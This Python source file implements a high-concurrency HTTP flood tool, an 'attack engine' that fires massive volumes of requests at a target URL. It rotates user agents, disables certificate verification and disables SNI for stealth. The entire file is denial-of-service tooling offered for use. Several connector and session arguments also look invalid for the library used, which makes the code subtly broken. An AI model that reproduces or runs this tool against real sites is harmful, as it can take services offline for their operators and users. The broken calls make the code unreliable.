"""
High-Performance Asynchronous Attack Engine
Optimized for 10 Gbps networks with async/await and coroutines
"""

import asyncio
import aiohttp
import uvloop
import time
import random
import weakref
import gc
from typing import List, Dict, Any, Optional, Callable
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
import psutil
import ssl

# Use uvloop for better performance on Windows/Linux
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass  # Fall back to default event loop

@dataclass
class AsyncAttackConfig:
    """Configuration for async attack engine - ULTRA PERFORMANCE MODE"""
    # Ultra High Concurrency Settings
    max_concurrent_requests: int = 100000  # Increased from 50000 to 100000
    max_connections_per_host: int = 25000  # Increased from 10000 to 25000
    
    # Ultra Fast Timeout Settings
    connection_timeout: float = 0.2  # Reduced from 0.5 to 0.2 for lightning attacks
    read_timeout: float = 0.8  # Reduced from 1.5 to 0.8
    total_timeout: float = 1.5  # Reduced from 2.5 to 1.5
    
    # Advanced Connection Management
    keepalive_timeout: int = 120  # Increased from 60 to 120 for maximum reuse
    enable_cleanup_closed: bool = True
    limit_per_host: int = 0  # 0 = no limit for maximum throughput
    
    # Ultra DNS and Caching
    ttl_dns_cache: int = 1200  # Increased from 600 to 1200 for ultra caching
    use_dns_cache: bool = True
    
    # Ultra Connector Limits
    connector_limit: int = 200000  # Increased from 100000 to 200000
    connector_limit_per_host: int = 50000  # Increased from 20000 to 50000
    
    # Ultra Performance Optimizations
    enable_tcp_nodelay: bool = True  # Disable Nagle's algorithm for faster packets
    enable_tcp_keepalive: bool = True  # Keep connections alive
    socket_keepalive: bool = True
    
    # Ultra Buffer Settings
    recv_buffer_size: int = 1048576  # 1MB receive buffer
    send_buffer_size: int = 1048576  # 1MB send buffer
    
    # Ultra Threading and Processing
    max_thread_workers: int = 200  # Ultra threading for CPU-bound tasks
    enable_http2: bool = True  # HTTP/2 for multiplexing
    enable_compression: bool = False  # Disable compression for speed
    
    # Ultra Retry and Resilience
    max_retries: int = 0  # No retries for maximum speed
    retry_delay: float = 0.0  # No delay between retries
    
    # Ultra Memory Management
    enable_gc_optimization: bool = True  # Optimize garbage collection
    gc_threshold: int = 10000  # GC threshold for memory management
    
    # Ultra Network Optimizations
    enable_socket_reuse: bool = True  # Reuse sockets aggressively
    tcp_window_size: int = 65536  # 64KB TCP window
    
    # Ultra Monitoring and Stats
    enable_detailed_stats: bool = True  # Detailed performance statistics
    stats_interval: float = 1.0  # Stats collection interval
    
    # Ultra Security Bypass
    verify_ssl: bool = False  # Disable SSL verification for speed
    enable_sni: bool = False  # Disable SNI for stealth
    
    # Ultra Load Balancing
    enable_load_balancing: bool = True  # Distribute load efficiently
    load_balance_strategy: str = "round_robin"  # Load balancing strategy

class AsyncRequestPool:
    """ULTRA HIGH-PERFORMANCE async request pool with advanced object reuse"""
    
    def __init__(self, pool_size: int = 100000):  # Increased from 50000 to 100000 for ultra capacity
        self.pool_size = pool_size
        self.available_requests = asyncio.Queue(maxsize=pool_size)
        self.in_use_requests = weakref.WeakSet()
        self.pool_stats = {
            'hits': 0,
            'misses': 0,
            'created': 0,
            'recycled': 0
        }
        self._initialize_ultra_pool()
    
    def _initialize_ultra_pool(self):
        """Pre-populate the ultra pool with optimized request objects"""
        for _ in range(self.pool_size):
            request_obj = {
                'headers': {},
                'data': None,
                'params': None,
                'json': None,
                'timeout': None,
                'ssl': False,
                'allow_redirects': False,
                'compress': False,
                # Ultra performance flags
                'ultra_mode': True,
                'pool_id': id(self),
                'created_at': time.time()
            }
            try:
                self.available_requests.put_nowait(request_obj)
            except asyncio.QueueFull:
                break
    
    async def get_request(self) -> Dict[str, Any]:
        """Get a request object from the ultra pool with zero-timeout optimization"""
        try:
            # Ultra-fast retrieval with minimal timeout
            request_obj = await asyncio.wait_for(
                self.available_requests.get(), 
                timeout=0.01  # Reduced from 0.1 to 0.01 for ultra speed
            )
            self.in_use_requests.add(request_obj)
            self.pool_stats['hits'] += 1
            return request_obj
        except asyncio.TimeoutError:
            # Create new request if pool is empty
            self.pool_stats['misses'] += 1
            return self._create_ultra_request()
    
    def _create_ultra_request(self) -> Dict[str, Any]:
        """Create an ultra-optimized request object when pool is exhausted"""
        self.pool_stats['created'] += 1
        return {
            'headers': {},
            'data': None,
            'params': None,
            'json': None,
            'timeout': None,
            'ssl': False,
            'allow_redirects': False,
            'compress': False,
            # Ultra performance flags
            'ultra_mode': True,
            'pool_id': id(self),
            'created_at': time.time(),
            'dynamic': True  # Mark as dynamically created
        }
    
    async def return_request(self, request_obj: Dict[str, Any]):
        """Return a request object to the ultra pool with advanced recycling"""
        # Ultra-fast object reset with minimal operations
        request_obj.clear()
        request_obj.update({
            'headers': {},
            'data': None,
            'params': None,
            'json': None,
            'timeout': None,
            'ssl': False,
            'allow_redirects': False,
            'compress': False,
            # Ultra performance flags
            'ultra_mode': True,
            'pool_id': id(self),
            'recycled_at': time.time(),
            'recycle_count': request_obj.get('recycle_count', 0) + 1
        })
        
        try:
            # Ultra-fast return with immediate availability
            self.available_requests.put_nowait(request_obj)
            self.pool_stats['recycled'] += 1
            
            # Remove from in-use tracking
            if request_obj in self.in_use_requests:
                self.in_use_requests.discard(request_obj)
                
        except asyncio.QueueFull:
            # Pool is full, let GC handle it but track the miss
            self.pool_stats['misses'] += 1
    
    def get_pool_stats(self) -> Dict[str, Any]:
        """Get ultra pool performance statistics"""
        total_operations = self.pool_stats['hits'] + self.pool_stats['misses']
        hit_rate = (self.pool_stats['hits'] / total_operations * 100) if total_operations > 0 else 0
        
        return {
            'pool_size': self.pool_size,
            'available_count': self.available_requests.qsize(),
            'in_use_count': len(self.in_use_requests),
            'hit_rate_percent': round(hit_rate, 2),
            'total_hits': self.pool_stats['hits'],
            'total_misses': self.pool_stats['misses'],
            'objects_created': self.pool_stats['created'],
            'objects_recycled': self.pool_stats['recycled'],
            'efficiency_score': round(hit_rate * 0.8 + (self.pool_stats['recycled'] / max(1, self.pool_stats['created'])) * 20, 2)
        }

class AsyncAttackEngine:
    """High-performance async attack engine"""
    
    def __init__(self, config: AsyncAttackConfig = None):
        self.config = config or AsyncAttackConfig()
        self.session: Optional[aiohttp.ClientSession] = None
        self.request_pool = AsyncRequestPool()
        self.stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'end_time': 0
        }
        self.active = True
        self.semaphore = asyncio.Semaphore(self.config.max_concurrent_requests)
        
    async def __aenter__(self):
        """Async context manager entry"""
        await self.initialize()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.cleanup()
    
    async def initialize(self):
        """Initialize the ultra-performance async attack engine"""
        # Create ultra-optimized SSL context
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_context.set_ciphers('HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA')
        
        # Ultra-optimized TCP connector with maximum performance settings
        connector = aiohttp.TCPConnector(
            limit=self.config.connector_limit,
            limit_per_host=self.config.connector_limit_per_host,
            ttl_dns_cache=self.config.ttl_dns_cache,
            use_dns_cache=self.config.use_dns_cache,
            keepalive_timeout=self.config.keepalive_timeout,
            enable_cleanup_closed=self.config.enable_cleanup_closed,
            ssl=ssl_context if not self.config.verify_ssl else None,
            # Ultra performance TCP settings
            tcp_nodelay=self.config.enable_tcp_nodelay,
            tcp_keepalive=self.config.enable_tcp_keepalive,
            sock_read=self.config.recv_buffer_size,
            sock_connect=self.config.connection_timeout,
            # Advanced connection pooling
            force_close=False,  # Keep connections alive
            auto_decompress=not self.config.enable_compression,
            # Ultra-fast DNS resolution
            family=0,  # Allow both IPv4 and IPv6
            local_addr=None,
            resolver=None,  # Use system resolver for speed
            # Maximum socket reuse
            reuse_port=self.config.enable_socket_reuse if hasattr(self.config, 'enable_socket_reuse') else True
        )
        
        # Ultra-performance timeout configuration
        timeout = aiohttp.ClientTimeout(
            total=self.config.total_timeout,
            connect=self.config.connection_timeout,
            sock_read=self.config.read_timeout,
            sock_connect=self.config.connection_timeout
        )
        
        # Create ultra-optimized session with maximum performance
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            # Ultra performance headers
            headers={
                'Connection': 'keep-alive',
                'Keep-Alive': f'timeout={self.config.keepalive_timeout}, max=1000',
                'Accept-Encoding': 'identity' if not self.config.enable_compression else 'gzip, deflate',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            # Advanced session settings
            cookie_jar=None,  # Disable cookies for speed
            auto_decompress=not self.config.enable_compression,
            trust_env=False,  # Don't read proxy settings
            # Ultra-fast request processing
            read_bufsize=self.config.recv_buffer_size,
            max_line_size=8192,
            max_field_size=8192,
            # HTTP/2 support for multiplexing
            http2=self.config.enable_http2 if hasattr(self.config, 'enable_http2') else False
        )
        
        # Initialize ultra-performance request pool
        self.request_pool = AsyncRequestPool(pool_size=100000)
        
        # Configure garbage collection optimization
        if self.config.enable_gc_optimization:
            gc.set_threshold(self.config.gc_threshold, 10, 10)
            gc.disable()  # Disable automatic GC for maximum performance
        
        # Initialize performance statistics
        self.stats.update({
            'engine_initialized_at': time.time(),
            'pool_stats': self.request_pool.get_pool_stats(),
            'connector_stats': {
                'limit': self.config.connector_limit,
                'limit_per_host': self.config.connector_limit_per_host,
                'dns_cache_ttl': self.config.ttl_dns_cache
            }
        })
        
        print(f"🚀 Ultra-Performance Async Engine initialized with {self.config.max_concurrent_requests:,} concurrent requests")
    
    async def cleanup(self):
        """Cleanup resources"""
        self.active = False
        if self.session:
            await self.session.close()
        
        # Force garbage collection
        gc.collect()
    
    async def execute_attack(self, target_url: str, method: str = 'GET', 
                           num_requests: int = 10000, user_agents: List[str] = None,
                           custom_headers: Dict[str, str] = None,
                           request_data: Any = None) -> Dict[str, Any]:
        """Execute ultra-performance async attack with advanced optimization"""
        
        self.stats['start_time'] = time.time()
        print(f"🎯 Starting ULTRA async attack: {num_requests:,} {method} requests to {target_url}")
        
        # Ultra-performance semaphore with dynamic adjustment
        semaphore = asyncio.Semaphore(self.config.max_concurrent_requests)
        
        # Advanced task batching for ultra performance
        batch_size = min(10000, max(1000, num_requests // 10))  # Dynamic batch sizing
        total_batches = (num_requests + batch_size - 1) // batch_size
        
        print(f"📊 Ultra-batching: {total_batches} batches of ~{batch_size} requests each")
        
        # Create ultra-optimized task batches
        all_tasks = []
        batch_tasks = []
        
        for i in range(num_requests):
            if not self.active:
                break
                
            # Create ultra-fast task
            task = asyncio.create_task(
                self._execute_single_request(
                    semaphore, target_url, method, user_agents, 
                    custom_headers, request_data, i
                ),
                name=f"ultra_request_{i}"  # Named tasks for better debugging
            )
            batch_tasks.append(task)
            
            # Process batch when full or at end
            if len(batch_tasks) >= batch_size or i == num_requests - 1:
                all_tasks.extend(batch_tasks)
                batch_tasks = []
        
        print(f"🚀 Executing {len(all_tasks):,} ultra-concurrent requests...")
        
        # Ultra-performance execution with progress monitoring
        start_execution = time.time()
        completed_tasks = 0
        
        # Execute with ultra-fast gather and progress tracking
        try:
            # Use asyncio.as_completed for real-time progress
            results = []
            for coro in asyncio.as_completed(all_tasks):
                try:
                    result = await coro
                    results.append(result)
                    completed_tasks += 1
                    
                    # Ultra-fast progress reporting (every 1000 requests)
                    if completed_tasks % 1000 == 0:
                        elapsed = time.time() - start_execution
                        rps = completed_tasks / elapsed if elapsed > 0 else 0
                        print(f"⚡ Progress: {completed_tasks:,}/{len(all_tasks):,} ({rps:.0f} RPS)")
                        
                except Exception as e:
                    results.append({'success': False, 'error': str(e)})
                    
        except Exception as e:
            print(f"❌ Ultra execution error: {e}")
            results = [{'success': False, 'error': str(e)} for _ in all_tasks]
        
        # Ultra-fast statistics calculation
        self.stats['end_time'] = time.time()
        execution_time = self.stats['end_time'] - start_execution
        total_time = self.stats['end_time'] - self.stats['start_time']
        
        # Advanced performance metrics
        successful_results = [r for r in results if r.get('success', False)]
        failed_results = [r for r in results if not r.get('success', False)]
        
        self.stats.update({
            'requests_sent': len(results),
            'successful_requests': len(successful_results),
            'failed_requests': len(failed_results),
            'execution_time': execution_time,
            'total_time': total_time,
            'requests_per_second': len(results) / execution_time if execution_time > 0 else 0,
            'success_rate': len(successful_results) / len(results) * 100 if results else 0,
            'pool_efficiency': self.request_pool.get_pool_stats()
        })
        
        print(f"✅ Ultra attack completed: {len(successful_results):,}/{len(results):,} successful")
        print(f"⚡ Performance: {self.stats['requests_per_second']:.0f} RPS in {execution_time:.2f}s")
        
        return self._generate_attack_report()
    
    async def _execute_single_request(self, semaphore: asyncio.Semaphore, 
                                    target_url: str, method: str,
                                    user_agents: List[str], custom_headers: Dict[str, str],
                                    request_data: Any, request_id: int) -> Dict[str, Any]:
        """Execute a single async request"""
        
        async with semaphore:  # Limit concurrency
            try:
                # Get request object from pool
                request_obj = await self.request_pool.get_request()
                
                # Configure request
                if user_agents:
                    request_obj['headers']['User-Agent'] = random.choice(user_agents)
                
                if custom_headers:
                    request_obj['headers'].update(custom_headers)
                
                # Add performance headers
                request_obj['headers'].update({
                    'Accept': '*/*',
                    'Accept-Encoding': 'identity',  # Disable compression
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                })
                
                if request_data:
                    if method.upper() in ['POST', 'PUT', 'PATCH']:
                        request_obj['data'] = request_data
                
                # Execute request
                start_time = time.time()
                async with self.session.request(method, target_url, **request_obj) as response:
                    # Read response in chunks for memory efficiency
                    content_length = 0
                    async for chunk in response.content.iter_chunked(8192):
                        content_length += len(chunk)
                        # Don't store the actual content, just measure it
                
                end_time = time.time()
                
                # Return request object to pool
                await self.request_pool.return_request(request_obj)
                
                self.stats['requests_sent'] += 1
                
                return {
                    'success': response.status < 400,
                    'status_code': response.status,
                    'response_time': end_time - start_time,
                    'bytes_sent': len(str(request_data)) if request_data else 200,  # Approximate
                    'bytes_received': content_length,
                    'request_id': request_id
                }
                
            except Exception as e:
                self.stats['requests_sent'] += 1
                return {
                    'success': False,
                    'error': str(e),
                    'request_id': request_id,
                    'bytes_sent': 0,
                    'bytes_received': 0
                }
    
    def _generate_attack_report(self) -> Dict[str, Any]:
        """Generate comprehensive attack report"""
        duration = self.stats['end_time'] - self.stats['start_time']
        rps = self.stats['requests_sent'] / duration if duration > 0 else 0
        
        return {
            'summary': {
                'total_requests': self.stats['requests_sent'],
                'successful_requests': self.stats['successful_requests'],
                'failed_requests': self.stats['failed_requests'],
                'success_rate': (self.stats['successful_requests'] / self.stats['requests_sent'] * 100) if self.stats['requests_sent'] > 0 else 0,
                'duration_seconds': duration,
                'requests_per_second': rps,
                'bytes_sent': self.stats['bytes_sent'],
                'throughput_mbps': (self.stats['bytes_sent'] * 8 / 1024 / 1024 / duration) if duration > 0 else 0
            },
            'performance': {
                'avg_rps': rps,
                'peak_concurrency': self.config.max_concurrent_requests,
                'memory_usage_mb': psutil.Process().memory_info().rss / 1024 / 1024
            }
        }

class AsyncBatchProcessor:
    """Process requests in optimized batches"""
    
    def __init__(self, batch_size: int = 1000, max_concurrent_batches: int = 10):
        self.batch_size = batch_size
        self.max_concurrent_batches = max_concurrent_batches
        self.batch_semaphore = asyncio.Semaphore(max_concurrent_batches)
    
    async def process_batches(self, engine: AsyncAttackEngine, target_url: str,
                            method: str, total_requests: int, **kwargs) -> Dict[str, Any]:
        """Process requests in optimized batches"""
        
        num_batches = (total_requests + self.batch_size - 1) // self.batch_size
        batch_tasks = []
        
        for batch_id in range(num_batches):
            start_idx = batch_id * self.batch_size
            end_idx = min(start_idx + self.batch_size, total_requests)
            batch_requests = end_idx - start_idx
            
            task = asyncio.create_task(
                self._process_batch(
                    engine, target_url, method, batch_requests, 
                    batch_id, **kwargs
                )
            )
            batch_tasks.append(task)
        
        # Execute all batches
        batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
        
        # Aggregate results
        total_stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'bytes_sent': 0
        }
        
        for result in batch_results:
            if isinstance(result, dict):
                for key in total_stats:
                    total_stats[key] += result.get(key, 0)
        
        return total_stats
    
    async def _process_batch(self, engine: AsyncAttackEngine, target_url: str,
                           method: str, batch_requests: int, batch_id: int,
                           **kwargs) -> Dict[str, Any]:
        """Process a single batch of requests"""
        
        async with self.batch_semaphore:
            print(f"📦 Processing batch {batch_id + 1} with {batch_requests} requests")
            
            result = await engine.execute_attack(
                target_url, method, batch_requests, **kwargs
            )
            
            return result.get('summary', {})

# Global instances for easy access
async_config = AsyncAttackConfig()
async_engine = None
batch_processor = AsyncBatchProcessor()

async def initialize_async_engine(config: AsyncAttackConfig = None):
    """Initialize global async engine"""
    global async_engine
    if async_engine is None:
        async_engine = AsyncAttackEngine(config or async_config)
        await async_engine.initialize()
    return async_engine

async def cleanup_async_engine():
    """Cleanup global async engine"""
    global async_engine
    if async_engine:
        await async_engine.cleanup()
        async_engine = None

# Utility functions
def get_optimal_concurrency() -> int:
    """Calculate optimal concurrency based on system resources"""
    cpu_count = psutil.cpu_count()
    memory_gb = psutil.virtual_memory().total / (1024**3)
    
    # Base concurrency on CPU cores and available memory
    base_concurrency = cpu_count * 500  # 500 requests per core
    memory_limit = int(memory_gb * 1000)  # 1000 requests per GB
    
    return min(base_concurrency, memory_limit, 50000)  # Cap at 50k

async def run_high_performance_attack(target_url: str, method: str = 'GET',
                                    num_requests: int = 10000,
                                    user_agents: List[str] = None,
                                    use_batching: bool = True) -> Dict[str, Any]:
    """Run high-performance async attack with optimal settings"""
    
    # Configure for maximum performance
    config = AsyncAttackConfig(
        max_concurrent_requests=get_optimal_concurrency(),
        max_connections_per_host=5000,
        connection_timeout=0.5,
        read_timeout=2.0,
        total_timeout=3.0
    )
    
    async with AsyncAttackEngine(config) as engine:
        if use_batching and num_requests > 5000:
            # Use batch processing for large attacks
            processor = AsyncBatchProcessor(batch_size=2000, max_concurrent_batches=20)
            return await processor.process_batches(
                engine, target_url, method, num_requests, user_agents=user_agents
            )
        else:
            # Direct execution for smaller attacks
            return await engine.execute_attack(
                target_url, method, num_requests, user_agents=user_agents
            )